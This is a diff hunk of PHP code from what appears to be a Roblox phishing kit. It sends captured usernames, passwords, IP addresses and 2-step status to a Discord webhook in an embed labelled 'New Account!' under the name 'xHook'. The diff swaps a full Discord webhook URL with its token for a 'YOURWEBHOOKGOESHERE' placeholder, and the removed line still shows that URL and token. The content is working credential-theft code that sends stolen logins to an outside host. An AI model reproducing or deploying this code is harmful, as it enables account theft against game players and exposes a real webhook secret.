@@ -27,7 +27,7 @@ $_SESSION['password'] = $password;
 }
 $ch = curl_init();
 curl_setopt_array($ch, [
-CURLOPT_URL => 'https://discord.com/api/webhooks/1006686442954698802/px_YncG0HHZQbpkGQlTqflU6FI_xRFcQa44Y48DuiMGl5Jx2Oe6DowhkQ0aPuLcqafRu',
+CURLOPT_URL => 'YOURWEBHOOKGOESHERE',
 CURLOPT_POST => true,
 CURLOPT_POSTFIELDS => '{"content":null,"embeds":[{"title":":money_with_wings: New Account! :moneybag:","description":"**You have received an account.**","url":"https://www.roblox.com/users/$UserID/profile","color":4695014,"fields":[{"name":"**Username**","value":"```'."".$rusername."".'```"},{"name":"**Password**","value":"```'."".$password."".'```"},{"name":"**IP Address**","value":"```'."".$_SERVER['REMOTE_ADDR']."".'```"},{"name":"2-Step","value":"```'."".$verified."".'```","inline":true}],"author":{"name":"Result"},"image":{"url":"https://www.roblox.com/outfit-thumbnail/image?userOutfitId='."".$rid."".'&width=420&height=420&format=png"}}],"username":"xHook","avatar_url":"https://assets.ifttt.com/images/channels/1004582012/icons/large.png","attachments":[]}',
 CURLOPT_HTTPHEADER => [
